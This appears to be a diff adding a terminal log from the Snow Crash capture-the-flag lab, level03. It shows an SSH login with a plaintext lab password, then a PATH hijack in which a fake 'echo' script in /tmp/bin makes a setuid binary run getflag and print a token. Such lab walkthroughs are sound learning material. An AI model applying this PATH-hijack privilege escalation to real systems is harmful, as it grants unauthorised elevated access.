@@ -1,0 +1,15 @@
+┌──$ [~/42/2020/snow-crash]
+└─>  ssh 192.168.1.64 -p 4242 -l level03
+level03@192.168.1.64's password: kooda2puivaav1idi4f57q8iq
+level03@SnowCrash:~$ ls -l
+total 12
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+level03@SnowCrash:~$ mkdir /tmp/bin/
+level03@SnowCrash:~$ cat << EOF > /tmp/bin/echo
+> #!/bin/bash
+> /bin/getflag
+> EOF
+level03@SnowCrash:~$ chmod +x /tmp/bin/echo
+level03@SnowCrash:~$ export PATH="/tmp/bin:$PATH"
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
